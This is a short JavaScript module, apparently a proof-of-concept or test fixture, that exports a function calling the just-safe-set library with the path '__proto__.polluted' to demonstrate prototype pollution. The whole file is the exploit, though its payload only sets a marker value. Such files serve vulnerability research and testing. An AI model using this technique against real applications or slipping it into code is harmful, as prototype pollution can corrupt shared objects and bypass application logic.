const justSafeSet = require("just-safe-set"); // Import justSafeSet at the top of the file

function exploitFunction(payload) {
    const { obj } = payload;

    // Apply the payload
    justSafeSet(obj, "__proto__.polluted", "yes");

    return obj;
}

module.exports = { exploitFunction };